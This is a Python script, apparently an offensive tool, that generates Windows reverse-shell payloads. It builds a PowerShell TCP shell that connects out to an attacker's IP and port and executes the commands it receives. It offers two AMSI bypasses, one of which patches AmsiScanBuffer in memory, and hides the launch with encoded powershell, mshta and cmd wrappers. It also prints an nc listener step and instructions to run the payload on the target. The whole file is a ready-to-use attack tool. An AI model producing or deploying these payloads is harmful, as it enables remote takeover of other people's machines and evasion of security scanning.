#!/usr/bin/env python3
import base64
import sys
import os

# --- COLORS ---
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
CYAN = "\033[96m"
RESET = "\033[0m"

# --- PAYLOAD COMPONENTS ---

REVERSE_SHELL_LOGIC = (
    "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
    "$stream = $client.GetStream();"
    "[byte[]]$bytes = 0..65535|%{{0}};"
    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
    "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
    "$sendback = (iex $data 2>&1 | Out-String );"
    "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
    "$stream.Write($sendbyte,0,$sendbyte.Length);"
    "$stream.Flush()}};$client.Close()"
)

AMSI_BYPASS_SIMPLE = (
    "$a='System.Management.Automation.A';"
    "$b='msiUtils';"
    "$c=[Ref].Assembly.GetType(('{0}{1}'-f$a,$b));"
    "$d=$c.GetField(('a'+'msiInitFailed'),'NonPublic,Static');"
    "$d.SetValue($null,$true);"
)

AMSI_BYPASS_ADVANCED = (
    "Add-Type @' using System;using System.Runtime.InteropServices;"
    "public class Win32{[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr hModule,string procName);"
    "[DllImport(\"kernel32\")]public static extern IntPtr LoadLibrary(string name);"
    "[DllImport(\"kernel32\")]public static extern bool VirtualProtect(IntPtr lpAddress,UIntPtr dwSize,uint flNewProtect,out uint lpflOldProtect);}'@;"
    "$Amsi=[Win32]::LoadLibrary('amsi.dll');"
    "$AmsiScanBuffer=[Win32]::GetProcAddress($Amsi,'AmsiScanBuffer');"
    "[Win32]::VirtualProtect($AmsiScanBuffer,[UIntPtr]5,0x40,[ref]0)|Out-Null;"
    "$Patch=[Byte[]](0x31,0xff,0x90);"
    "[System.Runtime.InteropServices.Marshal]::Copy($Patch,0,$AmsiScanBuffer,3);"
)

# --- HELPER FUNCTIONS ---
def generate_final_command(ps_command, use_base64, wrapper_type):
    if use_base64:
        encoded_ps = base64.b64encode(ps_command.encode('utf-16-le')).decode()
        ps_launcher = f"powershell.exe -nop -w hidden -e {encoded_ps}"
    else:
        escaped_ps_command = ps_command.replace('"', '`"')
        ps_launcher = f'powershell.exe -nop -w hidden -c "{escaped_ps_command}"'

    if wrapper_type == 'none':
        return ps_launcher
    elif wrapper_type == 'mshta':
        return f'mshta.exe vbscript:CreateObject("Wscript.Shell").Run("{ps_launcher}",0,True)'
    elif wrapper_type == 'cmd_mshta':
        return f'cmd.exe /c mshta.exe vbscript:CreateObject("Wscript.Shell").Run("{ps_launcher}",0,True)'
    else:
        raise ValueError("[!] Invalid wrapper type provided.")

def print_output(final_command, payload_desc, port):
    encoding_type = "BASE64 ENCODED" if "-e " in final_command else "RAW (NON-ENCODED)"
    print(f"\n{CYAN}{'=' * 50}{RESET}")
    print(f"{YELLOW}WINDOWS PAYLOAD ({payload_desc.upper()}) - GENERATION COMPLETE{RESET}")
    print(f"({encoding_type})")
    print(f"{CYAN}{'=' * 50}{RESET}")
    print(f"\n{GREEN}[1] Start this listener on your Linux machine:{RESET}")
    print(f"{GREEN}nc -lvnp {port}{RESET}")
    print(f"\n{YELLOW}[2] Run this command on the target Windows machine:{RESET}")
    print(f"{CYAN}{final_command}{RESET}\n")

def export_to_file(payload):
    export_choice = input(f"{YELLOW}Do you want to export the payload to a file? (y/n): {RESET}").lower().strip()
    if export_choice == 'y':
        file_name = input(f"{YELLOW}Enter filename (default: payload.txt): {RESET}").strip() or "payload.txt"
        if os.path.exists(file_name):
            overwrite = input(f"{RED}[!] File '{file_name}' exists. Overwrite? (y/n): {RESET}").lower().strip()
            if overwrite != 'y':
                print(f"{RED}[!] Export canceled.{RESET}")
                return
        try:
            with open(file_name, 'w') as f:
                f.write(payload)
            abs_path = os.path.abspath(file_name)
            print(f"\n{GREEN}[+] Payload saved to: {abs_path}{RESET}")
        except Exception as e:
            print(f"{RED}[!] Error saving file: {e}{RESET}")

# --- MAIN LOGIC ---
def main():
    menu = {
        '1': ("Simple PowerShell Payload", 'none', ""),
        '2': ("Payload with Simple AMSI Bypass", 'none', AMSI_BYPASS_SIMPLE),
        '3': ("Payload with MSHTA Wrapper", 'mshta', AMSI_BYPASS_SIMPLE),
        '4': ("Payload with Advanced AMSI Bypass", 'mshta', AMSI_BYPASS_ADVANCED),
        '5': ("Payload with CMD + MSHTA Wrapper", 'cmd_mshta', AMSI_BYPASS_ADVANCED)
    }

    print(f"{CYAN}--- Windows Reverse Shell Payload Generator ---{RESET}")
    for key, (desc, _, _) in menu.items():
        print(f"  {key}) {desc}")

    try:
        choice = input(f"{YELLOW}Select payload type (1-5): {RESET}").strip()
        if choice not in menu:
            print(f"\n{RED}[!] Invalid choice. Exiting.{RESET}", file=sys.stderr)
            sys.exit(1)

        desc, wrapper, amsi_logic = menu[choice]

        lhost = input(f"{YELLOW}Enter your listener IP address (LHOST): {RESET}").strip()
        lport = input(f"{YELLOW}Enter your listener port (LPORT): {RESET}").strip()
        if not lhost or not lport:
            print(f"\n{RED}[!] IP address and port cannot be empty.{RESET}", file=sys.stderr)
            sys.exit(1)

        use_base64_input = input(f"{YELLOW}Use Base64 encoding? (y/n, default: y): {RESET}").lower().strip()
        use_base64 = use_base64_input != 'n'

        # Build PowerShell command
        shell_logic = REVERSE_SHELL_LOGIC.format(ip=lhost, port=lport)
        ps_command = f"{amsi_logic}{shell_logic}" if amsi_logic else shell_logic

        # Generate payload
        final_command = generate_final_command(ps_command, use_base64, wrapper)

        # Output
        print_output(final_command, desc, lport)

        # Export option
        export_to_file(final_command)

    except (KeyboardInterrupt, EOFError):
        print(f"\n\n{RED}[!] Script terminated by user.{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{RED}[!] Error: {e}{RESET}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
